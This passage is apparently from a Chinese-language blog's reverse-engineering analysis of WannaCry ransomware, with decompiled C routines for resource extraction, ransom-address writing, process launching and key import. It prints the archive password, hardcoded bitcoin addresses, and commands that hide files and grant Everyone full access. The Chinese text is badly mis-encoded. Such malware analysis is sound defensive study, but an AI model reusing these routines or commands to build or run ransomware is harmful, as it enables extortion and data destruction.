ä¸‹</p><h3 id="5-2-3-ReleaseFiles-é‡Šæ”¾èµ„æºæ–‡ä»¶"><a href="#5-2-3-ReleaseFiles-é‡Šæ”¾èµ„æºæ–‡ä»¶" class="headerlink" title="5.2.3 ReleaseFiles é‡Šæ”¾èµ„æºæ–‡ä»¶"></a>5.2.3 ReleaseFiles é‡Šæ”¾èµ„æºæ–‡ä»¶</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>Â __cdeclÂ <span class="title">ReleaseFiles</span><span class="params">(HMODULEÂ hModule,Â <span class="keyword">char</span>Â *Str)</span>Â </span>&#123;Â Â </span><br><span class="line"></span><br><span class="line">hRsrcÂ =Â FindResourceA(hModule,Â (LPCSTR)<span class="number">0x80A</span>,Â Type);</span><br><span class="line"></span><br><span class="line">HRSRCÂ =Â hRsrc;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !hRsrcÂ )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">hGlobalÂ =Â LoadResource(hModule,Â hRsrc);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !hGlobalÂ )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å°†èµ„æºè½½å…¥åˆ°å†…å­˜å¹¶é”å®šÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">lpResÂ =Â LockResource(hGlobal);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !lpResÂ )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">ResourceSizeÂ =Â SizeofResource(hModule,Â HRSRC);</span><br><span class="line"></span><br><span class="line">v7Â =Â sub_4075AD(lpRes,Â ResourceSize,Â Str);Â Â Â Â <span class="comment">//Â str=&quot;WNcry@2017&quot;Â å‡½æ•°è¿”å›1||0Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !v7Â )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">v11Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;Str1,Â <span class="number">0</span>,Â <span class="number">0x128</span>u);Â Â </span><br><span class="line"></span><br><span class="line">SetReleasePath(v7,Â <span class="number">-1</span>,Â (<span class="keyword">int</span>)&amp;v11);Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å°†0x24æ”¾åˆ°å†…å­˜ä¸­Â v11=0x24Â Â </span></span><br><span class="line"></span><br><span class="line">v9Â =Â v11;Â Â </span><br><span class="line"></span><br><span class="line">v10Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â v11Â &gt;Â <span class="number">0</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">SetReleasePath(v7,Â (<span class="keyword">int</span>)v10,Â (<span class="keyword">int</span>)&amp;v11);Â Â <span class="comment">//Â è®¾ç½®æ–‡ä»¶é‡Šæ”¾çš„è·¯å¾„Â å¹¶ä¿å­˜åˆ°å†…å­˜ä¸­Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â <span class="built_in">strcmp</span>(&amp;Str1,Â Str2)Â ||Â GetFileAttributesA(&amp;Str1)Â ==Â <span class="number">-1</span>Â )</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â æ¯”è¾ƒb.wnryå’Œc.wnryÂ Â </span></span><br><span class="line"></span><br><span class="line">ReleaseFile((<span class="keyword">int</span>)v7,Â v10,Â &amp;Str1);Â Â Â Â Â Â Â <span class="comment">//Â é‡Šæ”¾æ–‡ä»¶åˆ°å·¥ä½œç›®å½•ä¸‹Â Â </span></span><br><span class="line"></span><br><span class="line">++v10;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â (<span class="keyword">signed</span>Â <span class="keyword">int</span>)v10Â &lt;Â v9Â );Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">FreeMemory(v7);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åšå†…å­˜é‡Šæ”¾ç­‰æ‰«å°¾å·¥ä½œÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°çš„ä¸»è¦ä½œç”¨å°±æ˜¯å°†èµ„æºåŒ…ä¸­çš„æ–‡ä»¶ï¼Œåˆ©ç”¨è§£å‹å¯†ç â€WNcry@1017â€è¿›è¡Œè§£å‹åˆ°å½“å‰è¿›ç¨‹çš„è·¯å¾„ä¸‹ï¼Œæ–¹ä¾¿ä¸‹é¢çš„æ“ä½œè¿›ä¸€æ­¥åˆ©ç”¨å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ã€‚</p><h3 id="5-2-4-WriteCwnry-é‡å†™c-wnry"><a href="#5-2-4-WriteCwnry-é‡å†™c-wnry" class="headerlink" title="5.2.4 WriteCwnry é‡å†™c.wnry"></a>5.2.4 WriteCwnry é‡å†™c.wnry</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>Â <span class="title">WriteCwnry</span><span class="params">()</span>Â Â Â Â </span>&#123;Â Â </span><br><span class="line"></span><br><span class="line">SourceÂ =Â a13am4vw2dhxygx;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94</span></span><br><span class="line"></span><br><span class="line">v5Â =Â a12t9ydpgwuez9n;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â 12t9YDPgwueZ9NyMgw519p7AA8isjr6SMwÂ Â </span></span><br><span class="line"></span><br><span class="line">v6Â =Â a115p7ummngoj1p;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â 115p7UMMngoj1pMvkpHijcRdfJNXj6LrLnÂ Â </span></span><br><span class="line"></span><br><span class="line">resultÂ =Â ReadOrWriteFileToMem(&amp;DstBuf,Â <span class="number">1</span>);Â Â Â Â <span class="comment">//Â è¯»å–c.wnryåˆ°å†…å­˜ä¸­Â Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â resultÂ )Â Â Â Â &#123;Â Â </span><br><span class="line"></span><br><span class="line">v1Â =Â rand();Â Â </span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(&amp;Dest,Â (&amp;Source)[v1Â %Â <span class="number">3</span>]);Â Â Â Â <span class="comment">//Â æ‹·è´éšæœºè´¦æˆ·åˆ°ç›®æ ‡å†…å­˜Â Â </span></span><br><span class="line"></span><br><span class="line">resultÂ =Â ReadOrWriteFileToMem(&amp;DstBuf,Â <span class="number">0</span>);Â Â <span class="comment">//Â å†™å…¥c.wnryåˆ°å†…å­˜Â Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â result;Â &#125;Â Â </span><br></pre></td></tr></table></figure><p>å‡½æ•°éšæœºçš„å°†ä¸‰ä¸ªæ¯”ç‰¹å¸è´¦æˆ·ä¸­çš„ä¸€ä¸ªå†™å…¥c.wnryæ–‡ä»¶ä¸­</p><h3 id="5-2-5-ExeCmdCommand-å‘½ä»¤è¡Œæ‰§è¡Œ"><a href="#5-2-5-ExeCmdCommand-å‘½ä»¤è¡Œæ‰§è¡Œ" class="headerlink" title="5.2.5 ExeCmdCommand å‘½ä»¤è¡Œæ‰§è¡Œ"></a>5.2.5 ExeCmdCommand å‘½ä»¤è¡Œæ‰§è¡Œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>Â __cdeclÂ <span class="title">ExeCmdCommand</span><span class="params">(LPSTRÂ lpCommandLine,Â DWORDÂ dwMilliseconds,Â LPDWORDÂ lpExitCode)</span>Â Â </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>Â _<span class="title">STARTUPINFOA</span>Â <span class="title">StartupInfo</span>;</span>Â <span class="comment">//è¯¥ç»“æ„ç”¨äºæŒ‡å®šæ–°è¿›ç¨‹çš„ä¸»çª—å£ç‰¹æ€§Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>Â _<span class="title">PROCESS_INFORMATION</span>Â <span class="title">ProcessInformation</span>;</span>Â <span class="comment">//Â [esp+4Ch]Â [ebp-10h]Â Â </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">StartupInfo.cbÂ =Â <span class="number">68</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;StartupInfo.lpReserved,Â <span class="number">0</span>,Â <span class="number">0x40</span>u);Â Â </span><br><span class="line"></span><br><span class="line">ProcessInformation.hProcessÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">ProcessInformation.hThreadÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">ProcessInformation.dwProcessIdÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">ProcessInformation.dwThreadIdÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">StartupInfo.wShowWindowÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">StartupInfo.dwFlagsÂ =Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !CreateProcessA(<span class="number">0</span>,Â lpCommandLine,Â <span class="number">0</span>,Â <span class="number">0</span>,Â <span class="number">0</span>,Â <span class="number">0x8000000</span>u,Â <span class="number">0</span>,Â <span class="number">0</span>,Â &amp;StartupInfo,Â &amp;ProcessInformation)Â )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â Â Â Â Â Â Â Â <span class="comment">//Â è®¾ç½®å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å±æ€§ä¸ºéšè—Â å‘½ä»¤è¡Œå‚æ•°é”™è¯¯Â å‡½æ•°å¹¶æœªæˆåŠŸÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â dwMillisecondsÂ )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â æ¡ä»¶ä¸æˆç«‹Â è·³è½¬åˆ°å…³é—­å¥æŸ„å¤„Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â WaitForSingleObject(ProcessInformation.hProcess,Â dwMilliseconds)Â )Â Â </span><br><span class="line"></span><br><span class="line">TerminateProcess(ProcessInformation.hProcess,Â <span class="number">0xFFFFFFFF</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â lpExitCodeÂ )Â Â </span><br><span class="line"></span><br><span class="line">GetExitCodeProcess(ProcessInformation.hProcess,Â lpExitCode);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">CloseHandle(ProcessInformation.hProcess);Â Â </span><br><span class="line"></span><br><span class="line">CloseHandle(ProcessInformation.hThread);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°ä¸»é¢˜é€»è¾‘ä¸­åˆ©ç”¨åˆ°äº†ä¸¤æ¬¡ExeCmdCommandå‡½æ•°ï¼š</p><p>ç¬¬ä¸€ä¸ªåˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹ å¹¶åˆ©ç”¨å‚æ•°â€attrib+hâ€<br>å°†å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶è®¾ç½®ä¸ºéšè—</p><p>ç¬¬äºŒä¸ªåˆ©ç”¨å‚æ•° â€œicacls ./grant Everyone:F /T /C /Qâ€æ·»åŠ ç”¨æˆ·å¹¶ç»™äºˆæƒé™</p><h2 id="5-3-åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œ"><a href="#5-3-åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œ" class="headerlink" title="5.3 åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œ"></a>5.3 åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œ</h2><p>åœ¨è¿™éƒ¨åˆ†æ‰€æ¶‰åŠçš„å‡½æ•°çš„æ“ä½œéƒ½åªæœ‰ä¸€ä¸ªç›®çš„ï¼Œå³åˆ©ç”¨dllæ–‡ä»¶ä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œä¸‹é¢æˆ‘ä»¬åˆ†æ­¥è¿›è¡Œåˆ†æ</p><h3 id="5-3-1-GetApis-è·å–å¿…è¦çš„APIå‡½æ•°"><a href="#5-3-1-GetApis-è·å–å¿…è¦çš„APIå‡½æ•°" class="headerlink" title="5.3.1 GetApis è·å–å¿…è¦çš„APIå‡½æ•°"></a>5.3.1 GetApis è·å–å¿…è¦çš„APIå‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span>Â <span class="keyword">int</span>Â <span class="title">GetApis</span><span class="params">()</span>Â Â </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;Â Â </span><br><span class="line"></span><br><span class="line">HMODULEÂ KernelBase;Â <span class="comment">//Â eaxÂ Â </span></span><br><span class="line"></span><br><span class="line">HMODULEÂ KernelAddr;Â <span class="comment">//Â ediÂ Â </span></span><br><span class="line"></span><br><span class="line">FARPROCÂ CloseHandle_Addr;Â <span class="comment">//Â eaxÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span>Â <span class="keyword">int</span>Â result;Â <span class="comment">//Â eaxÂ Â </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !GetCryptoAPIAddr()Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–CryptoAPIå‡½æ•°åœ°å€Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_15;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â CreateFileW_AddrÂ )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_16;Â Â </span><br><span class="line"></span><br><span class="line">KernelBaseÂ =Â LoadLibraryA(Kernel32);Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åŠ è½½Kernel32.dllçš„åŸºå€Â Â </span></span><br><span class="line"></span><br><span class="line">KernelAddrÂ =Â KernelBase;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !KernelBaseÂ )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_15;Â Â </span><br><span class="line"></span><br><span class="line">CreateFileW_AddrÂ =Â (<span class="keyword">int</span>)GetProcAddress(KernelBase,Â CreateFileW);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â è·å–æ–‡ä»¶æ“ä½œçš„APIå‡½æ•°åœ°å€Â Â </span></span><br><span class="line"></span><br><span class="line">WriteFile_AddrÂ =Â (<span class="keyword">int</span>)GetProcAddress(KernelAddr,Â WriteFile_0);Â Â </span><br><span class="line"></span><br><span class="line">ReadFile_AddrÂ =Â (BOOLÂ (__stdcallÂ *)(HANDLE,Â LPVOID,Â DWORD,Â LPDWORD,Â LPOVERLAPPED))GetProcAddress(Â Â </span><br><span class="line"></span><br><span class="line">KernelAddr,Â Â </span><br><span class="line"></span><br><span class="line">ReadFile_0);Â Â </span><br><span class="line"></span><br><span class="line">MoveFileW_AddrÂ =Â (<span class="keyword">int</span>)GetProcAddress(KernelAddr,Â MoveFileW);Â Â </span><br><span class="line"></span><br><span class="line">MoveFileExW_AddrÂ =Â (<span class="keyword">int</span>)GetProcAddress(KernelAddr,Â MoveFileExW);Â Â </span><br><span class="line"></span><br><span class="line">DeleteFileW_AddrÂ =Â (<span class="keyword">int</span>)GetProcAddress(KernelAddr,Â DeleteFileW);Â Â </span><br><span class="line"></span><br><span class="line">CloseHandle_AddrÂ =Â GetProcAddress(KernelAddr,Â CloseHandle_0);Â Â </span><br><span class="line"></span><br><span class="line">Int_CloseHandle_AddrÂ =Â (<span class="keyword">int</span>)CloseHandle_Addr;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !CreateFileW_AddrÂ )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_15;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â WriteFile_AddrÂ &amp;&amp;Â ReadFile_AddrÂ &amp;&amp;Â MoveFileW_AddrÂ &amp;&amp;Â MoveFileExW_AddrÂ &amp;&amp;Â DeleteFileW_AddrÂ &amp;&amp;Â CloseHandle_AddrÂ )Â Â </span><br><span class="line"></span><br><span class="line">LABEL_16:Â Â </span><br><span class="line"></span><br><span class="line">resultÂ =Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>Â Â </span><br><span class="line"></span><br><span class="line">LABEL_15:Â Â </span><br><span class="line"></span><br><span class="line">resultÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â result;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°çš„ä¸»è¦ç›®çš„å°±æ˜¯ä¸ºåé¢çš„æ“ä½œè·å–å¸¸ç”¨APIå‡½æ•°çš„åœ°å€ä¾‹å¦‚-CreateFileWã€‚</p><h3 id="5-3-2-CDatabase-CDataBase-æ„é€ å‡½æ•°"><a href="#5-3-2-CDatabase-CDataBase-æ„é€ å‡½æ•°" class="headerlink" title="5.3.2 CDatabase::CDataBase æ„é€ å‡½æ•°"></a>5.3.2 CDatabase::CDataBase æ„é€ å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>Â *__thiscallÂ <span class="title">CDatabase::CDatabase</span><span class="params">(_DWORDÂ *<span class="keyword">this</span>)</span>Â Â </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>Â *v1;Â <span class="comment">//Â esiÂ Â </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v1Â =Â (<span class="keyword">char</span>Â *)<span class="keyword">this</span>;Â Â </span><br><span class="line"></span><br><span class="line">Crt_InitializeCriticalSection((<span class="keyword">char</span>Â *)<span class="keyword">this</span>Â +Â <span class="number">4</span>);<span class="comment">//Â åˆå§‹åŒ–ä¸´ç•ŒåŒºå¯¹è±¡Â Â </span></span><br><span class="line"></span><br><span class="line">Crt_InitializeCriticalSection(v1Â +Â <span class="number">44</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â v1;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–ä¸¤ä¸ªç”¨äºçº¿ç¨‹åŒæ­¥çš„ä¸´ç•ŒåŒºå¯¹è±¡CDatabase</p><h3 id="5-3-3-ImportKeyAndAllocMem-å¯¼å…¥å¯†é’¥å¹¶ç”³è¯·ç©ºé—´"><a href="#5-3-3-ImportKeyAndAllocMem-å¯¼å…¥å¯†é’¥å¹¶ç”³è¯·ç©ºé—´" class="headerlink" title="5.3.3 ImportKeyAndAllocMem å¯¼å…¥å¯†é’¥å¹¶ç”³è¯·ç©ºé—´"></a>5.3.3 ImportKeyAndAllocMem å¯¼å…¥å¯†é’¥å¹¶ç”³è¯·ç©ºé—´</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>Â __thiscallÂ <span class="title">ImportKeyAndAllocMem</span><span class="params">(_DWORDÂ *<span class="keyword">this</span>,Â LPCSTRÂ FileName,Â <span class="keyword">int</span>Â a3,Â <span class="keyword">int</span>Â a4)</span>Â Â </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;Â Â </span><br><span class="line"></span><br><span class="line">_DWORDÂ *v4;Â <span class="comment">//Â esiÂ Â </span></span><br><span class="line"></span><br><span class="line">HGLOBALÂ hGlobal;Â <span class="comment">//Â eaxÂ Â </span></span><br><span class="line"></span><br><span class="line">HGLOBALÂ hGlobal_2;Â <span class="comment">//Â eaxÂ Â </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v4Â =Â <span class="keyword">this</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !ImportPrivateKey(<span class="keyword">this</span>Â +Â <span class="number">1</span>,Â FileName)Â )Â Â <span class="comment">//Â å¯¼å…¥ç§é’¥Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â FileNameÂ )Â Â </span><br><span class="line"></span><br><span class="line">ImportPrivateKey(v4Â +Â <span class="number">11</span>,Â <span class="number">0</span>);Â Â </span><br><span class="line"></span><br><span class="line">hGlobalÂ =Â GlobalAlloc(<span class="number">0</span>,Â <span class="number">0x100000</span>u);Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â ç”³è¯·ä¸€å—å…¨å±€çš„å›ºå®šå†…å­˜å—Â Â </span></span><br><span class="line"></span><br><span class="line">v4[<span class="number">306</span>]Â =Â hGlobal;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !hGlobalÂ )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">hGlobal_2Â =Â GlobalAlloc(<span class="number">0</span>,Â <span class="number">0x100000</span>u);Â Â </span><br><span class="line"></span><br><span class="line">v4[<span class="number">307</span>]Â =Â hGlobal_2;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !hGlobal_2Â )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span 